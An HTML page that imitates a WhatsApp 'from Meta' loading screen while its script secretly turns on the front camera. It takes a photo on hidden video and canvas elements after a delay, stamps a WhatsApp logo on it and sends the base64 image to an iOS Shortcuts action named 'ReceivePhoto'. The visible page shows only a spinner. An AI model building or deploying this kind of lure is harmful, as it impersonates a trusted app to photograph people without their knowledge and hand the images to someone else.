<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body {
    margin: 0;
    background: #111b21; /* WhatsApp dark bg */
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    flex-direction: column;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    color: white;
  }

  .logo {
    width: 80px;
    height: 80px;
    /* border-radius: 50%; */
    background: transparent;
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: 40px;
  }

  .title {
    margin-top: 20px;
    font-size: 22px;
    font-weight: 500;
  }

  .loader {
    margin-top: 30px;
    width: 40px;
    height: 40px;
    border: 3px solid rgba(255,255,255,0.2);
    border-top: 3px solid #25D366;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  .meta {
    position: absolute;
    bottom: 40px;
    font-size: 12px;
    color: #8696a0;
  }
</style>
</head>

<body>
<img  class="logo" src="./assets/wapp.png" alt="whatsapp">
<!-- <div class="logo"></div> -->
  <div class="title">WhatsApp</div>

  <div class="loader"></div>

  <div class="meta">from Meta</div>

<video  style="display:none;" id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>
<img id="logoImg" style="display:none;" src="./assets/wapp.png" alt="whatsapp">

<script>
  const video = document.getElementById('video');
  const logoImg = document.getElementById('logoImg');

  // Get delay from query parameter (default: 1500ms)
  const urlParams = new URLSearchParams(window.location.search);
  const delay = parseInt(urlParams.get('delay') || '1500', 10);

  navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  })
  .then(stream => {
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      setTimeout(() => {
        takePhoto();
      }, delay);
    };
  });

  function takePhoto() {
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    // Add WhatsApp logo at the bottom
    const logoSize = Math.min(canvas.width, canvas.height) * 0.05; // 10% of smallest dimension
    const logoX = canvas.width - logoSize - 15; // 15px from right
    const logoY = canvas.height - logoSize - 15; // 15px from bottom

    // Draw a semi-transparent white background for the logo
    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.beginPath();
    ctx.arc(logoX + logoSize / 2, logoY + logoSize / 2, logoSize / 2 + 5, 0, Math.PI * 2);
    ctx.fill();

    // Draw the logo image
    ctx.drawImage(logoImg, logoX, logoY, logoSize, logoSize);

    const base64 = canvas.toDataURL("image/jpeg", 0.6);
    const encoded = encodeURIComponent(base64);

    // stop camera
    video.srcObject.getTracks().forEach(track => track.stop());

    window.location.href =
      `shortcuts://run-shortcut?name=ReceivePhoto&input=text&text=${encoded}`;
  }
</script>

</body>
</html>
